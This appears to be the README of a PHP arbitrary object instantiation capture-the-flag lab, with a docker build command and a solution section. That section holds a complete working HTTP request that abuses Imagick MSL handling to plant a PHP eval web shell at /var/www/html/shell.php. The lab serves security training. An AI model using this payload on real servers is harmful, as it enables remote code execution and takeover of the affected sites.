# arbitrary-object-instantiation

A PHP, Arbitrary Object Instantiation Lab

A challenge / playground for the bug described [here](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/).

## build

Build the container, specifying the flag you want for the challenge with the `--build-arg` value:

```text
docker build -t apoi:local . --build-arg flag_value="flag{your_flag}"
```

## solution

Write a shell so you could exec something like `system('env');`

```text
POST /image.php?module=Imagick&params=vid:msl:/tmp/php*&size=1 HTTP/1.1
Host: localhost
Content-Length: 364
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABOhqQ5dmxPyigV2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/index.html
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundaryABOhqQ5dmxPyigV2
Content-Disposition: form-data; name="pictures"; filename="pew.msl"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @eval(@$_REQUEST['a']); ?&gt;" />
 <write filename="info:/var/www/html/shell.php" />
</image>

------WebKitFormBoundaryABOhqQ5dmxPyigV2--
```
